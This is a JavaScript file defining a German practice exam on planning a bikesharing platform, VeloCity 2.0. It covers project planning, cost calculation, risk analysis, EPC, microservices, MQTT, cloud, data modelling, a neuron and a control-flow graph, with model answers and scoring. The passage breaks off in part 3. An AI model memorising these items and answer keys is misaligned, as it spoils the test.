// Probeprüfung 5, Planen eines Softwareproduktes: VeloCity Leipzig GmbH, Bikesharing-Plattform (hybrides Vorgehen, Architektur, IoT, KI, Sicherheit).
(function () {
  const ID = 'exam5-ps';
  const G = (rows, cap) => ['diagram', AP2.dg.gantt(rows, {total: 16, unit: 34, left: 210, tickLabel: (t) => 'W' + t, tick: 1, labels: true, cap})];
  AP2.page(ID, {b: 'exam', g: 'Probeprüfung 5 (Mobilität)', t: 'Planen eines Softwareproduktes: Bikesharing VeloCity', blocks: []});
  AP2.exam.start(ID, {minutes: 90, cover: AP2.exam.COVER.ps,
    hint: 'Schwerpunkte: hybrides Vorgehen, Ressourcenplanung im Gantt-Diagramm, Kalkulation, Risikoanalyse, Lizenzen, EPK, Microservices, MQTT, Cloud und Container, KI, Kontrollflussgraph, Git und CI/CD, Routing, Angriffserkennung in Logdateien, Signaturen.',
    intro: [
      ['p', 'Sie arbeiten bei der **Saxon Apps GmbH** in Dresden. Die **VeloCity Leipzig GmbH** betreibt ein Bikesharing-System mit **1.800 Rädern** (davon 700 E-Bikes) an **260 Stationen**. Die Räder haben ein **smartes Schloss** mit GPS und LTE-Modem, das Statusmeldungen sendet und Befehle empfängt.'],
      ['p', 'Ihr Auftrag ist die neue Plattform **VeloCity 2.0**: App zum Ausleihen per QR-Code, Abrechnung, Flottenmanagement für die Servicetechniker und eine **KI-gestützte Bedarfsprognose**, damit leere Stationen rechtzeitig wieder befüllt werden. Die Schlösser liefert ein externer Hersteller mit fester Schnittstelle.'],
      ['kv', [['Kunde', 'VeloCity Leipzig GmbH (kommunale Beteiligung), 60 Beschäftigte'], ['Auftragnehmer', 'Saxon Apps GmbH, Team: Anna (App, Schloss), Ben (Backend), weitere nach Bedarf'], ['Rahmen', 'Festpreisangebot, Start der Saison am 1. April'], ['Technik', 'Cloud-Hosting in der EU, MQTT für die Schlösser, REST für die Apps']]],
    ]});
  AP2.exam.part(ID, {
    t: 'Handlungsschritt 1: Projekt planen und kalkulieren (25 Punkte)',
    tasks: [
      {pts: 5, topic: 'Vorgehensmodell', q: 'Die Schloss-Schnittstelle ist vom Hersteller fest vorgegeben, die Anforderungen an die App ändern sich dagegen laufend. Schlagen Sie ein passendes Vorgehen vor und begründen Sie es. Grenzen Sie dabei Wasserfallmodell, Scrum und Kanban voneinander ab.',
        a: ['Empfehlung: **hybrides Vorgehen**. Hardwareintegration, Verträge und Meilensteine (Saisonstart, Abnahme) **plangetrieben** (Wasserfall/Phasen mit Meilensteinen), die App-Entwicklung **agil mit Scrum** (kurze Sprints, Feedback der Nutzer). Betrieb und Fehlerbehebung nach dem Go-live mit **Kanban** (kontinuierlicher Fluss, WIP-Limits).', '- **Wasserfall:** sequentielle Phasen, vollständige Anforderungen zu Beginn, Änderungen teuer; gut bei stabilen Anforderungen.', '- **Scrum:** feste Sprints, Rollen (Product Owner, Scrum Master, Entwickler), Inkrement je Sprint; gut bei unsicheren Anforderungen.', '- **Kanban:** keine Sprints und festen Rollen, Visualisierung auf dem Board, **Begrenzung der parallelen Arbeit (WIP-Limit)**, Pull-Prinzip; gut für Support und Wartung.'],
        see: ['ps-vorgehen', 'ps-scrum']},
      {pts: 8, rows: 8, topic: 'Gantt und Ressourcen', q: 'Vorgänge (Dauer in Wochen): **A** Anforderungen 3 (alle), **B** App-Entwicklung 6 (Anna, nach A), **C** Schloss-Schnittstelle 4 (Anna, nach A), **D** Backend 5 (Ben, nach A), **E** Test und Abnahme 2 (nach B, C und D). a) Erstellen Sie ein Gantt-Diagramm ohne Berücksichtigung der Ressourcen und geben Sie die Projektdauer an. b) Erkennen Sie den Ressourcenkonflikt, lösen Sie ihn durch Verschieben und geben Sie die neue Dauer an. c) Schlagen Sie eine bessere Lösung vor.',
        a: ['a) A W0 bis W3; B W3 bis W9, C W3 bis W7, D W3 bis W8; E nach dem spätesten Vorgänger (B) W9 bis W11: **11 Wochen**.', 'b) **Konflikt:** Anna müsste B und C in W3 bis W7 **gleichzeitig** bearbeiten. Nacheinander (zum Beispiel C zuerst, weil die Hardware-Schnittstelle das größere Risiko ist): C W3 bis W7, B W7 bis W13, E W13 bis W15: **15 Wochen** (+4).', 'c) Ben ist nach D ab W8 frei: **Ben übernimmt C** (W8 bis W12), Anna B (W3 bis W9), E W12 bis W14: **14 Wochen**. Noch besser: C an eine **zusätzliche Person** (oder Werkstudent/Hersteller-Support) vergeben, dann 11 Wochen. Weitere Ideen: Teile von B auf Ben verlagern, Umfang von B reduzieren (MVP).', 'Bewertung: a) 3 P, b) 3 P, c) 2 P.'],
        sol: [['walk', {t: 'Ressourcenkonflikt im Gantt-Diagramm', steps: [
          {t: '**Ohne Ressourcen:** B, C und D starten gleichzeitig nach A. E wartet auf den längsten Vorgänger B. Dauer **11 Wochen**.', b: [G([['A Anforderungen', 0, 3, 'plain'], ['B App (Anna)', 3, 6], ['C Schloss (Anna)', 3, 4, 'bad'], ['D Backend (Ben)', 3, 5, 'ok'], ['E Test', 9, 2, 'gold'], ['Ende', 11, 0]], 'Rot markiert: Anna ist in W3 bis W7 doppelt verplant')]},
          {t: '**Konflikt lösen durch Verschieben:** Anna macht erst C, dann B. B endet in W13, E in W15: **15 Wochen**.', b: [G([['A Anforderungen', 0, 3, 'plain'], ['C Schloss (Anna)', 3, 4], ['B App (Anna)', 7, 6], ['D Backend (Ben)', 3, 5, 'ok'], ['E Test', 13, 2, 'gold'], ['Ende', 15, 0]], 'Kapazitätstreu, aber 4 Wochen länger')]},
          {t: '**Bessere Verteilung:** Ben übernimmt C nach dem Backend. Anna arbeitet ohne Unterbrechung an B. Dauer **14 Wochen**; mit einer zusätzlichen Person für C wieder 11 Wochen.', b: [G([['A Anforderungen', 0, 3, 'plain'], ['B App (Anna)', 3, 6], ['D Backend (Ben)', 3, 5, 'ok'], ['C Schloss (Ben)', 8, 4, 'ok'], ['E Test', 12, 2, 'gold'], ['Ende', 14, 0]], 'Ressourcen ausgeglichen')]},
        ]}]],
        see: ['ps-gantt', 'ps-netzplan']},
      {pts: 4, topic: 'Angebotskalkulation', q: 'Für die Plattform werden **1.200 Personenstunden** zu einem Stundensatz von **62 Euro** (Personaleinzelkosten) geschätzt. Der Gemeinkostenzuschlag beträgt **40 %**, der Gewinnzuschlag **15 %**. Berechnen Sie den **Nettoangebotspreis** in Euro.',
        num: {c: 119784, tol: 1, unit: 'Euro'},
        a: [['table', ['Position', 'Rechnung', 'Euro'], [['Personaleinzelkosten', '1.200 h x 62 Euro', '74.400,00'], ['+ Gemeinkosten 40 %', '74.400 x 0,40', '29.760,00'], ['= Selbstkosten', '', '104.160,00'], ['+ Gewinn 15 %', '104.160 x 0,15', '15.624,00'], ['= **Nettoangebotspreis**', '', '**119.784,00**'], ['+ Umsatzsteuer 19 %', '', '22.758,96'], ['= Bruttoangebotspreis', '', '142.542,96']]]],
        see: ['ps-kalkulation', 'ps-angebot']},
      {pts: 4, rows: 6, topic: 'Risikoanalyse', q: 'Bewerten Sie die Risiken mit dem **erwarteten Schaden** (Eintrittswahrscheinlichkeit x Schadenshöhe), bringen Sie sie in eine Rangfolge und nennen Sie für das größte Risiko eine vorbeugende Maßnahme. Warum sollte Risiko R3 trotz seines Rangs besonders beachtet werden?',
        ctx: [['table', ['Nr.', 'Risiko', 'Wahrscheinlichkeit', 'Schaden'], [['R1', 'Lieferverzug der Schlösser', '40 %', '50.000 Euro'], ['R2', 'Ausfall der Schlüsselentwicklerin', '10 %', '80.000 Euro'], ['R3', 'Datenschutzverstoß mit Standortdaten', '5 %', '300.000 Euro'], ['R4', 'Geringe Akzeptanz der neuen App', '30 %', '40.000 Euro']]]],
        a: [['table', ['Rang', 'Risiko', 'erwarteter Schaden'], [['1', 'R1 Lieferverzug', '0,40 x 50.000 = **20.000 Euro**'], ['2', 'R3 Datenschutz', '0,05 x 300.000 = **15.000 Euro**'], ['3', 'R4 Akzeptanz', '0,30 x 40.000 = **12.000 Euro**'], ['4', 'R2 Personalausfall', '0,10 x 80.000 = **8.000 Euro**']]],
          'Maßnahme R1: Liefertermin mit **Vertragsstrafe** absichern, frühe Teillieferung von Musterschlössern, **Simulator/Mock** der Schnittstelle, damit die Entwicklung nicht wartet, zweiten Lieferanten prüfen.', 'R3: Der Erwartungswert verdeckt die **sehr hohe Schadenshöhe** (Bußgelder bis 4 % des Jahresumsatzes, Imageschaden). Solche Risiken mit kleiner Wahrscheinlichkeit und großem Schaden werden in der Risikomatrix gesondert betrachtet: **Datenschutz durch Technikgestaltung**, Pseudonymisierung, kurze Löschfristen, DSFA.'],
        sol: [['diagram', {w: 700, h: 300, cap: 'Risikomatrix: R3 liegt trotz geringer Wahrscheinlichkeit im kritischen Bereich (hoher Schaden)', nodes: [
          {id: 'y', k: 'text', x: 60, y: 150, t: 'Wahrscheinlichkeit', w: 10, h: 10, mw: 110},
          {id: 'c1', k: 'box', x: 220, y: 60, w: 150, h: 70, t: '', s: 'gold'}, {id: 'c2', k: 'box', x: 380, y: 60, w: 150, h: 70, t: 'R1', s: 'bad'}, {id: 'c3', k: 'box', x: 540, y: 60, w: 150, h: 70, t: '', s: 'bad'},
          {id: 'c4', k: 'box', x: 220, y: 140, w: 150, h: 70, t: 'R4', s: 'ok'}, {id: 'c5', k: 'box', x: 380, y: 140, w: 150, h: 70, t: 'R2', s: 'gold'}, {id: 'c6', k: 'box', x: 540, y: 140, w: 150, h: 70, t: '', s: 'bad'},
          {id: 'c7', k: 'box', x: 220, y: 220, w: 150, h: 70, t: '', s: 'ok'}, {id: 'c8', k: 'box', x: 380, y: 220, w: 150, h: 70, t: '', s: 'ok'}, {id: 'c9', k: 'box', x: 540, y: 220, w: 150, h: 70, t: 'R3', s: 'gold'},
          {id: 'x', k: 'text', x: 380, y: 282, t: 'Schadenshöhe: gering - mittel - hoch', w: 10, h: 10, mw: 400},
        ], edges: []}]],
        see: ['ps-stakeholder']},
      {pts: 4, topic: 'Lizenzen', q: 'Die Plattform soll folgende Komponenten nutzen: a) Kartendaten von **OpenStreetMap** (ODbL), b) eine JSON-Bibliothek unter **MIT-Lizenz**, c) eine Routing-Engine unter **AGPL-3.0** im Backend, das als Webdienst betrieben wird. Welche Pflichten ergeben sich jeweils?',
        a: ['a) **ODbL**: Namensnennung ("© OpenStreetMap-Mitwirkende") in der App; veränderte und veröffentlichte **Datenbanken** müssen unter derselben Lizenz stehen (Share-Alike), die eigene App selbst nicht.', 'b) **MIT** (permissiv): Lizenztext und Copyright-Hinweis beilegen; eigener Code darf proprietär bleiben.', 'c) **AGPL**: starkes Copyleft, das auch bei Nutzung **über das Netzwerk** greift. Wird die Engine verändert und als Dienst angeboten, muss der **Quellcode der veränderten Fassung** den Nutzern zugänglich gemacht werden. Lösung: unverändert und als getrennter Dienst betreiben oder eine kommerzielle Lizenz erwerben. (Bei der GPL greift die Pflicht nur bei Weitergabe der Software.)'],
        see: ['ps-lizenzen']},
    ],
  });
  AP2.exam.part(ID, {
    t: 'Handlungsschritt 2: Prozesse und Architektur (25 Punkte)',
    tasks: [
      {pts: 7, rows: 9, topic: 'EPK', q: 'Modellieren Sie die Ausleihe als **ereignisgesteuerte Prozesskette (EPK)**: Ein Kunde will ein Rad ausleihen und scannt in der App den QR-Code. Ist das Rad identifiziert, wird das Kundenkonto (Kundendatenbank) geprüft. Ist das Konto gültig, wird das Schloss geöffnet und die Ausleihe ist gestartet. Ist es gesperrt, erscheint ein Hinweis und die Ausleihe ist abgelehnt.',
        a: ['Regeln: Die EPK beginnt und endet mit **Ereignissen** (Sechsecke); Ereignisse und **Funktionen** (abgerundete Rechtecke) wechseln sich ab; nach einer Funktion, die entscheidet, folgt ein **XOR-Verknüpfungsoperator** (exklusives Oder), weil Ereignisse nicht entscheiden können. Informationsobjekte (Kundendatenbank) und Organisationseinheiten (App/Kunde) werden in der erweiterten EPK angehängt.', 'Bewertung: Ereignisse und Funktionen im Wechsel (3 P), XOR nach der Funktion (2 P), Start- und Endereignisse (1 P), Informationsobjekt (1 P).'],
        sol: [['diagram', {w: 760, h: 600, keep: 600, cap: 'Musterlösung: erweiterte EPK der Ausleihe (Sechseck = Ereignis, abgerundet = Funktion, Kreis = Verknüpfung)', nodes: [
          {id: 'e1', k: 'hex', x: 380, y: 40, w: 230, h: 46, t: 'Kunde will Rad ausleihen', s: 'cat4'},
          {id: 'f1', k: 'round', x: 380, y: 110, w: 210, h: 44, t: 'QR-Code scannen', s: 'ok'}, {id: 'o1', k: 'oval', x: 140, y: 110, w: 130, h: 44, t: 'Kunde (App)', s: 'gold'},
          {id: 'e2', k: 'hex', x: 380, y: 180, w: 200, h: 46, t: 'Rad identifiziert', s: 'cat4'},
          {id: 'f2', k: 'round', x: 380, y: 250, w: 210, h: 44, t: 'Kundenkonto prüfen', s: 'ok'}, {id: 'i1', k: 'cyl', x: 630, y: 250, w: 150, h: 56, t: 'Kundendatenbank', s: 'soft'},
          {id: 'x', k: 'circle', x: 380, y: 320, w: 46, h: 46, t: 'XOR'},
          {id: 'e3', k: 'hex', x: 220, y: 395, w: 180, h: 46, t: 'Konto gültig', s: 'cat4'}, {id: 'e4', k: 'hex', x: 540, y: 395, w: 180, h: 46, t: 'Konto gesperrt', s: 'cat4'},
          {id: 'f3', k: 'round', x: 220, y: 465, w: 180, h: 44, t: 'Schloss öffnen', s: 'ok'}, {id: 'f4', k: 'round', x: 540, y: 465, w: 180, h: 44, t: 'Hinweis anzeigen', s: 'ok'},
          {id: 'e5', k: 'hex', x: 220, y: 540, w: 190, h: 46, t: 'Ausleihe gestartet', s: 'cat4'}, {id: 'e6', k: 'hex', x: 540, y: 540, w: 190, h: 46, t: 'Ausleihe abgelehnt', s: 'cat4'},
        ], edges: [{a: 'e1', b: 'f1'}, {a: 'f1', b: 'e2'}, {a: 'e2', b: 'f2'}, {a: 'f2', b: 'x'}, {a: 'x', b: 'e3'}, {a: 'x', b: 'e4'}, {a: 'e3', b: 'f3'}, {a: 'e4', b: 'f4'}, {a: 'f3', b: 'e5'}, {a: 'f4', b: 'e6'},
          {a: 'o1', b: 'f1', ea: 'none'}, {a: 'i1', b: 'f2', k: 'dash'}]}],
          ['warn', 'Klassischer Fehler: Verzweigung direkt nach einem **Ereignis** mit XOR oder ODER. Ereignisse sind passiv und können nicht entscheiden; vor einer Verzweigung muss eine **Funktion** stehen.']],
        see: ['ps-epk']},
      {pts: 6, rows: 8, topic: 'Microservices', q: 'Das alte System ist ein **Monolith**. Für VeloCity 2.0 wird eine **Microservice-Architektur** erwogen. a) Nennen Sie je zwei Vor- und Nachteile. b) Schlagen Sie vier fachlich geschnittene Services vor und skizzieren Sie die Architektur mit API-Gateway und Nachrichtenbroker für die Schlösser.',
        a: ['a) Vorteile: Services **unabhängig entwickel-, deploy- und skalierbar** (Ausleihe im Sommer stark skalieren), Fehler bleiben isoliert, Technologiefreiheit je Team. Nachteile: **höhere Komplexität** im Betrieb (Monitoring, Netzwerk, verteilte Fehler), Datenkonsistenz über Services hinweg schwierig (keine gemeinsame Transaktion), mehr Infrastruktur (Container, Orchestrierung).', 'b) Services zum Beispiel: **Nutzerverwaltung**, **Ausleihe**, **Abrechnung**, **Flottenmanagement** (Schlösser, Akkus, Wartung), optional **Prognose** (KI). Jeder Service mit **eigener Datenbank**. Die Apps sprechen nur mit dem **API-Gateway** (Authentifizierung, Routing, Rate Limiting). Die Schlösser kommunizieren über einen **MQTT-Broker** mit dem Flottenservice; Services tauschen Ereignisse (zum Beispiel "Ausleihe beendet") asynchron aus.'],
        sol: [['diagram', {w: 880, h: 420, keep: 720, cap: 'Microservice-Architektur VeloCity 2.0: Gateway für die Apps, Broker für die Schlösser, je Service eine eigene Datenbank', nodes: [
          {id: 'app', k: 'box', x: 90, y: 80, w: 130, h: 44, t: 'Kunden-App'}, {id: 'tech', k: 'box', x: 90, y: 160, w: 130, h: 44, t: 'Techniker-App'},
          {id: 'gw', k: 'box', x: 270, y: 120, w: 130, h: 60, t: ['API-Gateway', 'Auth, Routing'], s: 'accent'},
          {id: 's1', k: 'box', x: 470, y: 50, w: 150, h: 44, t: 'Nutzer-Service', s: 'ok'}, {id: 's2', k: 'box', x: 470, y: 120, w: 150, h: 44, t: 'Ausleih-Service', s: 'ok'},
          {id: 's3', k: 'box', x: 470, y: 190, w: 150, h: 44, t: 'Abrechnungs-Service', s: 'ok'}, {id: 's4', k: 'box', x: 470, y: 300, w: 150, h: 44, t: 'Flotten-Service', s: 'ok'},
          {id: 'd1', k: 'cyl', x: 660, y: 50, w: 90, h: 44, t: 'DB'}, {id: 'd2', k: 'cyl', x: 660, y: 120, w: 90, h: 44, t: 'DB'}, {id: 'd3', k: 'cyl', x: 660, y: 190, w: 90, h: 44, t: 'DB'}, {id: 'd4', k: 'cyl', x: 660, y: 300, w: 90, h: 44, t: 'DB'},
          {id: 'mq', k: 'box', x: 270, y: 330, w: 130, h: 56, t: ['MQTT-Broker', 'TLS 8883'], s: 'gold'}, {id: 'lk', k: 'box', x: 90, y: 330, w: 130, h: 56, t: ['1.800 Schlösser', 'LTE'], s: 'soft'},
          {id: 'bus', k: 'box', x: 800, y: 190, w: 110, h: 60, t: ['Event-Bus', '(Ereignisse)'], s: 'soft'},
        ], edges: [{a: 'app', b: 'gw'}, {a: 'tech', b: 'gw'}, {a: 'gw', b: 's1'}, {a: 'gw', b: 's2'}, {a: 'gw', b: 's3'}, {a: 'gw', b: 's4', via: [[340, 260], [470, 260]]},
          {a: 's1', b: 'd1', ea: 'none'}, {a: 's2', b: 'd2', ea: 'none'}, {a: 's3', b: 'd3', ea: 'none'}, {a: 's4', b: 'd4', ea: 'none'},
          {a: 'lk', b: 'mq', sa: 'arrow'}, {a: 'mq', b: 's4', sa: 'arrow'}, {a: 's3', b: 'bus', k: 'dash', via: [[470, 240], [800, 240]]}, {a: 's2', b: 'bus', k: 'dash', via: [[560, 92], [800, 92]]}]}]],
        see: ['ps-architektur']},
      {pts: 6, rows: 8, topic: 'MQTT', q: 'Die Schlösser sind per **MQTT** angebunden. a) Erklären Sie das Publish-Subscribe-Prinzip mit Broker. b) Entwerfen Sie eine Topic-Struktur für Statusmeldungen und Befehle und geben Sie ein Abonnement mit Platzhalter für alle Statusmeldungen einer Station an. c) Wählen Sie begründet den QoS-Level für "Schloss öffnen" und für die GPS-Position. d) Wie erkennt der Broker ein Schloss, das plötzlich die Verbindung verliert?',
        a: ['a) Clients senden Nachrichten an ein **Topic** beim **Broker** (Publish); der Broker verteilt sie an alle Clients, die das Topic **abonniert** haben (Subscribe). Sender und Empfänger kennen sich nicht (Entkopplung), die Schlösser bauen nur eine ausgehende Verbindung auf (gut für LTE und Firewalls).', 'b) Zum Beispiel **velocity/station/{stationId}/rad/{radId}/status** und **velocity/rad/{radId}/befehl**. Alle Statusmeldungen von Station 17: **velocity/station/17/rad/+/status** (+ = eine Ebene, # = alle folgenden Ebenen, etwa velocity/station/17/#).', 'c) **Schloss öffnen: QoS 1** (mindestens einmal; Öffnen ist idempotent, ein Duplikat schadet nicht) oder QoS 2 (genau einmal, mehr Overhead). **GPS-Position: QoS 0** (höchstens einmal), weil laufend neue Werte kommen und ein verlorener Wert unkritisch ist; spart Datenvolumen und Akku.', 'd) Über **Last Will and Testament (LWT)**: Das Schloss hinterlegt beim Verbinden eine Nachricht (zum Beispiel "offline", **retained**), die der Broker veröffentlicht, wenn die Verbindung ohne ordnungsgemäßes Trennen abbricht (Keep-Alive-Zeit überschritten).', 'Sicherheit: TLS (Port 8883), Client-Zertifikate je Schloss, Zugriffsrechte (ACL) je Topic.'],
        sol: [['seq', {w: 760, actors: ['Schloss Rad 4711', 'MQTT-Broker', 'Flotten-Service', 'Techniker-App'], cap: 'Publish-Subscribe: Der Broker verteilt Nachrichten an alle Abonnenten; bei Verbindungsabbruch veröffentlicht er den Last Will.', steps: [
          [2, 1, 'SUBSCRIBE velocity/station/+/rad/+/status', 's'], [3, 1, 'SUBSCRIBE velocity/station/17/#', 's'], [0, 1, 'CONNECT (LWT: offline, retained)', 's'],
          [0, 1, 'PUBLISH .../17/rad/4711/status: frei, Akku 64 %', 's'], [1, 2, 'Weiterleitung', 'a'], [1, 3, 'Weiterleitung', 'a'],
          [2, 1, 'PUBLISH velocity/rad/4711/befehl: öffnen (QoS 1)', 's'], [1, 0, 'Weiterleitung', 'a'], [0, 1, 'PUBACK', 'r'], ['sep', 'LTE-Verbindung bricht ab, Keep-Alive läuft ab'], [1, 2, 'Last Will: offline', 'a']]}]],
        see: ['infra-mqtt', 'eua-iot']},
      {pts: 6, topic: 'Cloud und Container', q: 'a) Ordnen Sie zu, wofür VeloCity bei **IaaS**, **PaaS** und **SaaS** jeweils selbst verantwortlich ist. b) Das Backend soll in **Containern** statt in virtuellen Maschinen laufen. Erläutern Sie den Unterschied und zwei Vorteile.',
        a: [['table', ['Schicht', 'IaaS', 'PaaS', 'SaaS'], [['Anwendung und Daten', '**Kunde**', '**Kunde**', 'Anbieter (Daten: Kunde verantwortlich)'], ['Laufzeitumgebung, Middleware', '**Kunde**', 'Anbieter', 'Anbieter'], ['Betriebssystem', '**Kunde**', 'Anbieter', 'Anbieter'], ['Virtualisierung, Server, Netz, Rechenzentrum', 'Anbieter', 'Anbieter', 'Anbieter'], ['Beispiel', 'virtuelle Server', 'verwaltete Datenbank, App-Plattform', 'Microsoft 365, Ticketsystem']]],
          'b) Eine **VM** enthält ein **vollständiges Gastbetriebssystem** auf einem Hypervisor. **Container** teilen sich den **Kernel des Host-Betriebssystems** und enthalten nur Anwendung und Bibliotheken. Vorteile: **schneller Start** (Sekunden), **geringerer Ressourcenbedarf**, gleiches Image von der Entwicklung bis zur Produktion (keine "läuft nur bei mir"-Fehler), einfache Skalierung mit Orchestrierung (Kubernetes). Nachteil: schwächere Isolation als VMs.'],
        sol: [['row', [['diagram', AP2.dg.layers([['App A | App B', 'Anwendungen', 'accent'], ['Gast-OS | Gast-OS', 'je VM ein Betriebssystem', 'gold'], ['Hypervisor', 'Typ 1 oder Typ 2', 'soft'], ['Hardware', 'Server', 'soft']], {w: 420, lw: 170, cap: 'Virtuelle Maschinen'})],
          ['diagram', AP2.dg.layers([['App A | App B', 'Container mit Bibliotheken', 'accent'], ['Container-Runtime', 'zum Beispiel Docker, containerd', 'ok'], ['Host-Betriebssystem', 'ein gemeinsamer Kernel', 'gold'], ['Hardware', 'Server', 'soft']], {w: 420, lw: 170, cap: 'Container'})]]]],
        see: ['infra-virtualisierung', 'ps-tco']},
    ],
  });
  AP2.exam.part(ID, {
    t: 'Handlungsschritt 3: Daten, KI und Softwarequalität (25 Punkte)',
    tasks: [
      {pts: 7, rows: 9, topic: 'ER- und Relationenmodell', q: 'Modellieren Sie: Ein **Kunde** leiht viele **Räder** aus; jede **Ausleihe** gehört zu einem Kunden und einem Rad und hat Startzeit, Endzeit und Preis. Eine Ausleihe beginnt an einer **Startstation** und endet an einer **Zielstation** (solange sie läuft, ist die Zielstation leer). Ein Rad steht an höchstens einer Station. a) Erstellen Sie das Relationenmodell mit Primär- und Fremdschlüsseln. b) Welche Besonderheit hat die Beziehung zwischen Ausleihe und Station?',
        a: ['a) **kunde** (PK kunde_id, name, abo), **station** (PK station_id, name, stadtteil), **rad** (PK rad_id, typ, FK station_id **NULL erlaubt**), **ausleihe** (PK ausleihe_id, FK kunde_id, FK rad_id, **FK start_station**, **FK ziel_station NULL erlaubt**, start_zeit, ende_zeit, preis).', 'b) Zwischen ausleihe und station bestehen **zwei Beziehungen** mit unterschiedlichen **Rollen** (Start und Ziel). Deshalb zwei Fremdschlüssel, die beide auf station verweisen. Die Zielstation ist optional (0..1), solange die Ausleihe läuft. In Abfragen wird station dann zweimal mit verschiedenen Aliasen gejoint.', 'Bewertung: Tabellen und PK (2 P), FKs (3 P), Rollen und optionale FKs (2 P).'],
        sol: [['diagram', {w: 860, h: 300, keep: 700, cap: 'Relationenmodell: zwei Rollen-Beziehungen zwischen ausleihe und station (start, ziel)', nodes: [
          {id: 'k', k: 'cls', x: 110, y: 80, w: 180, t: {name: 'kunde', attrs: ['PK kunde_id', 'name', 'abo']}},
          {id: 'a', k: 'cls', x: 400, y: 120, w: 220, s: 'accent', t: {name: 'ausleihe', attrs: ['PK ausleihe_id', 'FK kunde_id', 'FK rad_id', 'FK start_station', 'FK ziel_station (NULL)', 'start_zeit, ende_zeit', 'preis']}},
          {id: 'r', k: 'cls', x: 110, y: 230, w: 180, t: {name: 'rad', attrs: ['PK rad_id', 'typ', 'FK station_id (NULL)']}},
          {id: 's', k: 'cls', x: 720, y: 140, w: 190, t: {name: 'station', attrs: ['PK station_id', 'name', 'stadtteil']}},
        ], edges: [{a: 'a', b: 'k', sa: 'many', ea: 'one'}, {a: 'a', b: 'r', sa: 'many', ea: 'one'}, {a: 'a', b: [625, 120], sa: 'many', ea: 'one', t: 'start', via: [[560, 120]]}, {a: 'a', b: [625, 165], sa: 'many', ea: 'zeroone', t: 'ziel', via: [[560, 165]]},
          {a: 'r', b: 's', sa: 'many', ea: 'zeroone', via: [[110, 285], [720, 285]], t: 'steht an'}]}]],
        see: ['ps-relational', 'ps-ermrm']},
      {pts: 3, topic: 'Neuron', q: 'Die Bedarfsprognose nutzt ein neuronales Netz. Ein Neuron hat die Eingaben **x1 = 1** (Wochenende ja) und **x2 = 0,5** (Regenwahrscheinlichkeit), die Gewichte **w1 = 0,8** und **w2 = -0,4** sowie den Bias **b = 0,1**. Berechnen Sie die **Netzeingabe** (gewichtete Summe plus Bias).',
        num: {c: 0.7, tol: 0.001},
        a: ['net = x1 · w1 + x2 · w2 + b = 1 · 0,8 + 0,5 · (-0,4) + 0,1 = 0,8 - 0,2 + 0,1 = **0,7**.', 'Mit einer **Schwellenwertfunktion** (Ausgabe 1, wenn net ≥ 0) gibt das Neuron **1** aus. Beim Training werden die Gewichte so angepasst, dass der Fehler zwischen Vorhersage und tatsächlichem Wert sinkt (Backpropagation).'],
        sol: [['tool', 'neuron']],
        see: ['eua-knn', 'wiso-ki']},
      {pts: 3, topic: 'Maschinelles Lernen', q: 'Für die Prognose liegen die Ausleihen der letzten drei Jahre mit Wetter und Wochentag vor. a) Welche Lernart liegt vor? b) Warum teilt man die Daten in Trainings- und Testdaten, und was bedeutet Überanpassung (Overfitting)?',
        a: ['a) **Überwachtes Lernen** (Supervised Learning): Zu jedem Datensatz ist das Ergebnis (Zahl der Ausleihen) bekannt; es handelt sich um eine **Regression**. Unüberwachtes Lernen findet Muster ohne Zielwert (zum Beispiel Clustering von Stationen).', 'b) Das Modell wird mit den Trainingsdaten gelernt und mit **ungesehenen Testdaten** bewertet, um die **Verallgemeinerung** zu prüfen. **Overfitting**: Das Modell lernt die Trainingsdaten (inklusive Zufallsrauschen) auswendig, ist dort sehr gut, versagt aber bei neuen Daten.'],
        see: ['eua-knn', 'wiso-ki']},
      {pts: 6, rows: 9, topic: 'Kontrollflussgraph', q: 'Zeichnen Sie den **Kontrollflussgraphen** der Methode, berechnen Sie die **zyklomatische Komplexität** nach McCabe und geben Sie eine minimale Menge von Testfällen für die **Zweigüberdeckung (C1)** an.',
        ctx: [['code', 'java', `double durchschnittAkku(int[] akku) {
    int summe = 0, anzahl = 0, i = 0;      // 1
    while (i < akku.length) {              // 2
        if (akku[i] >= 0) {                // 3
            summe += akku[i];              // 4
            anzahl++;
        }
        i++;                               // 5
    }
    if (anzahl == 0) return 0;             // 6  -> 7
    return (double) summe / anzahl;        // 8
}`]],
        a: ['Knoten 1 bis 8 und ein Endknoten 9 (N = 9), Kanten 1-2, 2-3, 3-4, 3-5, 4-5, 5-2, 2-6, 6-7, 6-8, 7-9, 8-9 (E = 11).', '**M = E - N + 2 = 11 - 9 + 2 = 4**, alternativ Anzahl Entscheidungen (while, if, if) + 1 = 4.', 'Zweigüberdeckung mit **2 Testfällen**: **akku = []** (while sofort falsch, anzahl == 0 wahr: Ergebnis 0) und **akku = [50, -1]** (while wahr, if wahr bei 50, if falsch bei -1, anzahl == 0 falsch: Ergebnis 50,0). Damit ist jede Kante mindestens einmal durchlaufen.', 'Bewertung: Graph 2 P, M 2 P, Testfälle 2 P.'],
        sol: [['diagram', {w: 640, h: 520, cap: 'Kontrollflussgraph: 9 Knoten, 11 Kanten, drei Entscheidungsknoten (2, 3, 6)', nodes: [
          {id: 'n1', k: 'circle', x: 320, y: 30, w: 40, h: 40, t: '1'}, {id: 'n2', k: 'circle', x: 320, y: 100, w: 40, h: 40, t: '2', s: 'accent'},
          {id: 'n3', k: 'circle', x: 220, y: 180, w: 40, h: 40, t: '3', s: 'accent'}, {id: 'n4', k: 'circle', x: 140, y: 260, w: 40, h: 40, t: '4'},
          {id: 'n5', k: 'circle', x: 220, y: 330, w: 40, h: 40, t: '5'}, {id: 'n6', k: 'circle', x: 450, y: 260, w: 40, h: 40, t: '6', s: 'accent'},
          {id: 'n7', k: 'circle', x: 380, y: 360, w: 40, h: 40, t: '7'}, {id: 'n8', k: 'circle', x: 520, y: 360, w: 40, h: 40, t: '8'}, {id: 'n9', k: 'circle', x: 450, y: 450, w: 40, h: 40, t: 'Ende'},
        ], edges: [{a: 'n1', b: 'n2'}, {a: 'n2', b: 'n3', t: 'i < n'}, {a: 'n3', b: 'n4', t: '≥ 0'}, {a: 'n3', b: 'n5', t: '< 0', lo: [16, 0]}, {a: 'n4', b: 'n5'},
          {a: 'n5', b: 'n2', via: [[60, 330], [60, 100]]}, {a: 'n2', b: 'n6', t: 'sonst'}, {a: 'n6', b: 'n7', t: 'anzahl = 0'}, {a: 'n6', b: 'n8'}, {a: 'n7', b: 'n9'}, {a: 'n8', b: 'n9'}]}]],
        see: ['ps-ueberdeckung', 'eua-testfaelle']},
